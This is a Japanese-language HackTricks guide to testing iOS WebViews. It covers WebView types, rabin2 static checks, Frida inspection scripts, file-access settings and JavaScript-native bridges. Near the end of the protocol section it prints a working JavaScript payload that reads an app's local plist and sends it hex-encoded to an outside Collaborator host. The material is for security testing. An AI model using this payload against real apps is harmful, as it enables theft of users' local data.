# iOS WebViews

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見る
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter**で私をフォローする🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **ハッキングトリックを共有するには、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>

このページのコードは[こちら](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)から抽出されました。詳細についてはページをチェックしてください。

## WebViewsの種類

WebViewsはアプリケーション内でWebコンテンツをインタラクティブに表示するために使用されます。iOSアプリケーション向けにさまざまな種類のWebViewsがあり、異なる機能とセキュリティ機能を提供しています。以下は簡単な概要です:

- **UIWebView**はiOS 12以降推奨されていません。**JavaScript**の無効化をサポートしていないため、スクリプトのインジェクションや**Cross-Site Scripting (XSS)**攻撃の影響を受けやすくなっています。

- **WKWebView**はアプリにWebコンテンツを組み込むための選択肢です。コンテンツとセキュリティ機能に対する強化された制御を提供します。**JavaScript**はデフォルトで有効ですが、必要に応じて無効にすることもできます。また、JavaScriptが自動的にウィンドウを開かないようにする機能をサポートし、すべてのコンテンツが安全に読み込まれることを保証します。さらに、**WKWebView**のアーキテクチャは、メインのアプリプロセスに影響を与えるメモリ破損のリスクを最小限に抑えています。

- **SFSafariViewController**はアプリ内で標準化されたWebブラウジング体験を提供します。読み取り専用のアドレスフィールド、共有およびナビゲーションボタン、Safariでコンテンツを開くための直接リンクを含む特定のレイアウトで認識できます。**SFSafariViewController**では**JavaScript**を無効にすることはできず、Safariとクッキーおよびデータを共有し、ユーザーのプライバシーをアプリから保護します。App Storeのガイドラインに従って目立つ位置に表示する必要があります。
```objetivec
// Example of disabling JavaScript in WKWebView:
WKPreferences *preferences = [[WKPreferences alloc] init];
preferences.javaScriptEnabled = NO;
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
config.preferences = preferences;
WKWebView *webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
```
## WebViews Configuration Exploration Summary

### **Static Analysis Overview**

**WebViews**の構成を調査する過程で、主に注目されるのは2つの主要なタイプ、**UIWebView**と**WKWebView**です。これらのWebViewsをバイナリ内で特定するために、特定のクラス参照や初期化メソッドを検索するためにコマンドが利用されます。

- **UIWebViewの識別**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
```
このコマンドは、バイナリ内でそれに関連するテキスト文字列を検索することで、**UIWebView** のインスタンスを特定するのに役立ちます。

- **WKWebViewの特定**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
```
同様に、**WKWebView**について、このコマンドは、その使用を示すテキスト文字列をバイナリ内で検索します。

さらに、**WKWebView**がどのように初期化されるかを見つけるために、次のコマンドが実行され、その初期化に関連するメソッドシグネチャが対象となります:
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
```
#### **JavaScriptの構成の検証**

**WKWebView**の場合、JavaScriptを無効にすることが必要でない限り、無効にすることが最善の方法とされています。`javaScriptEnabled`プロパティが`false`に設定されていることを確認するために、コンパイルされたバイナリが検索され、JavaScriptが無効になっていることが確認されます。
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
```
#### **Only Secure Content Verification**

**WKWebView**は、**UIWebView**とは対照的に、混合コンテンツの問題を特定する機能を提供します。これは、すべてのページリソースが安全な接続を介してロードされていることを確認するために`hasOnlySecureContent`プロパティを使用してチェックされます。コンパイルされたバイナリ内での検索は、次のように実行されます：
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
### **動的解析インサイト**

動的解析には、WebViewインスタンスとそのプロパティを調査することが含まれます。`webviews_inspector.js`というスクリプトが使用され、`UIWebView`、`WKWebView`、`SFSafariViewController`インスタンスを対象としています。このスクリプトは、見つかったインスタンスに関する情報をログに記録し、URLやJavaScript、セキュアコンテンツに関連する設定についても記録します。

ヒープの検査は、`ObjC.choose()`を使用してWebViewインスタンスを特定し、`javaScriptEnabled`や`hasonlysecurecontent`のプロパティをチェックすることができます。

{% code title="webviews_inspector.js" %}
```objetivec
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

スクリプトは次のように実行されます：
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
```
**主な成果**:
- WebViewのインスタンスが正常に特定および検査されます。
- JavaScriptの有効化と安全なコンテンツ設定が確認されます。

この要約は、WebViewの構成を静的および動的アプローチを通じて分析する際に関与する重要な手順とコマンドを網羅し、JavaScriptの有効化や混合コンテンツの検出などのセキュリティ機能に焦点を当てています。

## WebViewプロトコルの処理

WebViewでコンテンツを処理することは重要です、特に`http(s)://`、`file://`、`tel://`などのさまざまなプロトコルを扱う場合にはそうです。これらのプロトコルにより、アプリ内でリモートおよびローカルコンテンツの読み込みが可能になります。ローカルコンテンツを読み込む際には、ユーザーがファイル名やパスに影響を与えたり、コンテンツ自体を編集したりすることを防ぐための注意が必要です。

**WebViews**はコンテンツの読み込みに異なるメソッドを提供しています。**UIWebView**では、現在は非推奨となっている`loadHTMLString:baseURL:`や`loadData:MIMEType:textEncodingName:baseURL:`などのメソッドが使用されます。一方、**WKWebView**では、Webコンテンツのために`loadHTMLString:baseURL:`、`loadData:MIMEType:textEncodingName:baseURL:`、`loadRequest:`が使用されます。ローカルファイルを読み込む際には、通常`pathForResource:ofType:`、`URLForResource:withExtension:`、`init(contentsOf:encoding:)`などのメソッドが利用されます。特に、`loadFileURL:allowingReadAccessToURL:`メソッドは、特定のURLやディレクトリをWebViewに読み込む能力を持っており、ディレクトリが指定された場合には機密データが露出する可能性があります。

これらのメソッドをソースコードやコンパイルされたバイナリで見つけるためには、次のようなコマンドが使用されます:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
Regarding **file access**, UIWebView allows it universally, whereas WKWebView introduces `allowFileAccessFromFileURLs` and `allowUniversalAccessFromFileURLs` settings for managing access from file URLs, with both being false by default.

A Frida script example is provided to inspect **WKWebView** configurations for security settings:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```
最後に、ローカルファイルを外部に持ち出すことを目的としたJavaScriptペイロードの例が、適切に構成されていないWebViewsに関連する潜在的なセキュリティリスクを示しています。このペイロードは、ファイルの内容を16進数形式にエンコードしてからサーバーに送信するため、WebViewの実装における厳格なセキュリティ対策の重要性を強調しています。
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## WebViewを介して公開されるネイティブメソッド

## iOSにおけるWebViewネイティブインターフェースの理解

iOS 7以降、AppleはWebView内のJavaScriptとネイティブSwiftまたはObjective-Cオブジェクト間の通信のためのAPIを提供しました。この統合は主に次の2つの方法を通じて実現されます：

- **JSContext**：SwiftまたはObjective-Cブロックが`JSContext`内の識別子にリンクされると、JavaScript関数が自動的に作成されます。これにより、JavaScriptとネイティブコードの間でシームレスな統合と通信が可能になります。
- **JSExport Protocol**：`JSExport`プロトコルを継承することで、ネイティブのプロパティ、インスタンスメソッド、およびクラスメソッドをJavaScriptに公開できます。これにより、JavaScript環境で行われた変更がネイティブ環境にも反映され、その逆も同様です。ただし、この方法を介して機密データが誤って公開されないようにすることが重要です。

### Objective-Cでの`JSContext`へのアクセス

Objective-Cでは、`UIWebView`の`JSContext`には次のコード行でアクセスできます：
```objc
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### `WKWebView`との通信

`WKWebView`では、`JSContext`への直接アクセスは利用できません。代わりに、`postMessage`関数を介してメッセージのやり取りが行われ、JavaScriptからネイティブへの通信が可能となります。これらのメッセージのハンドラは以下のように設定され、JavaScriptがネイティブアプリケーションと安全にやり取りできるようになります。
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### インタラクションとテスト

JavaScript は、スクリプトメッセージハンドラを定義することで、ネイティブレイヤーとやり取りできます。これにより、Web ページからネイティブ関数を呼び出すなどの操作が可能になります。
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}

// Alternative method for calling exposed JavaScript functions
document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
以下は、ネイティブ関数呼び出しの結果をキャプチャして操作するために、HTML内でコールバック関数をオーバーライドする方法です：
```html
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
ネイティブ側は、`JavaScriptBridgeMessageHandler`クラスでJavaScriptの呼び出しを処理し、数値の乗算などの操作の結果を処理してJavaScriptに送り返し、表示やさらなる操作が行われます。
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {
// Handling "multiplyNumbers" operation
case "multiplyNumbers":
let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
// Callback to JavaScript
let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
}
```
## iOS WebViewsのデバッグ

（[https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews)からのチュートリアルに基づく）

iOSのWebViews内のWebコンテンツを効果的にデバッグするには、`console.log()`に送信されたメッセージがXcodeログに表示されないため、Safariの開発者ツールを使用する特定のセットアップが必要です。以下は、主要な手順と要件を強調した簡略化されたガイドです：

- **iOSデバイスの準備**: iOSデバイスでSafari Web Inspectorを有効にする必要があります。これは、**設定 > Safari > Advanced**に移動し、_Web Inspector_を有効にすることで行われます。

- **macOSデバイスの準備**: macOSの開発マシンで、Safari内で開発者ツールを有効にする必要があります。Safariを起動し、**Safari > Preferences > Advanced**にアクセスし、_Show Develop menu_オプションを選択します。

- **接続とデバッグ**: iOSデバイスをmacOSコンピュータに接続し、アプリケーションを起動した後、macOSデバイス上のSafariを使用してデバッグしたいWebViewsを選択します。Safariのメニューバーで _Develop_に移動し、iOSデバイスの名前にカーソルを合わせると、WebViewsの一覧が表示され、調査したいインスタンスを選択します。この目的のために新しいSafari Web Inspectorウィンドウが開きます。

ただし、次の制限に注意してください：

- この方法でのデバッグにはmacOSデバイスが必要です。なぜなら、Safariに依存しているからです。
- Xcodeを介してデバイスにロードされたアプリケーション内のWebViewsのみがデバッグの対象となります。App StoreやApple Configuratorを介してインストールされたアプリ内のWebViewsはこの方法でデバッグできません。


## 参考文献

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）でAWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>こちら</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に参加するか、Twitter🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)をフォローする。
* ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する。

</details>
